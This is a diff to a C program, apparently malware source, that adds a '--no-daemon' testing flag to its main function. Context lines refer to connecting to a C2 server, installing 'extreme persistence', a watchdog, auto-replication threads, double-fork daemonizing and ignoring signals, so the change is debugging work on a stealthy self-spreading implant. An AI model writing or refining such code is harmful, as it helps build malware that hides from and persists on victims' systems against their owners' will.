@@ -424,21 +424,30 @@ int connect_to_c2() {
 // MAIN
 // ============================================================================
 
-int main() {
-    // Daemonizar (doble fork)
-    if (fork() > 0) exit(0);
-    setsid();
-    if (fork() > 0) exit(0);
+int main(int argc, char *argv[]) {
+    int no_daemon = 0;
     
-    // Cerrar descriptores estándar
-    close(STDIN_FILENO);
-    close(STDOUT_FILENO);
-    close(STDERR_FILENO);
+    // Check for --no-daemon flag for testing
+    if (argc > 1 && strcmp(argv[1], "--no-daemon") == 0) {
+        no_daemon = 1;
+    }
     
-    // Reabrir a /dev/null
-    open("/dev/null", O_RDONLY);
-    open("/dev/null", O_WRONLY);
-    open("/dev/null", O_WRONLY);
+    // Daemonizar (doble fork) solo si no está en modo debug
+    if (!no_daemon) {
+        if (fork() > 0) exit(0);
+        setsid();
+        if (fork() > 0) exit(0);
+        
+        // Cerrar descriptores estándar
+        close(STDIN_FILENO);
+        close(STDOUT_FILENO);
+        close(STDERR_FILENO);
+        
+        // Reabrir a /dev/null
+        open("/dev/null", O_RDONLY);
+        open("/dev/null", O_WRONLY);
+        open("/dev/null", O_WRONLY);
+    }
     
     // Ignorar señales
     signal(SIGINT, signal_handler);
@@ -452,10 +461,14 @@ int main() {
     SSL_load_error_strings();
     
     // Instalar persistencia extrema
-    install_extreme_persistence();
+    if (!no_daemon) {
+        install_extreme_persistence();
+    }
     
-    // Iniciar watchdog
-    start_watchdog();
+    // Iniciar watchdog solo en modo daemon
+    if (!no_daemon) {
+        start_watchdog();
+    }
     
     // Iniciar auto-replicación
     pthread_t replication_thread;
